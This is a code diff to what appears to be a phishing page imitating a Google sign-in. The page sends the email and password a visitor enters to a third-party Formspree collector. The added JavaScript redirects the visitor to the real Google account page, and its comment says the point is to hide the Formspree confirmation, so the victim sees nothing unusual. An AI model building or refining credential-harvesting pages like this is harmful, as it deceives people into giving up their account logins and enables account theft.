@@ -224,7 +224,7 @@
         </div>
 
         <div class="right-side-container">
-            <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST">
+            <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST" onsubmit="submitForm(event)">
                 <input type="email" id="emailInput" name="email" class="input-box" placeholder="Email or phone" autocomplete="username">
                 <div id="passwordContainer" style="display: none;">
                     <label for="fluff" id="passwordLabel">Password</label>
@@ -278,7 +278,16 @@
         }
 
         function submitPassword(event) {
-            // Form submission logic
+            event.preventDefault();
+
+            // Hide Formspree confirmation and redirect to Google account page
+            window.location.href = "https://myaccount.google.com";
+        }
+
+        function submitForm(event) {
+            // Prevent default form submission and redirect to Google Account page
+            event.preventDefault();
+            window.location.href = "https://myaccount.google.com";
         }
     </script>
 </body>
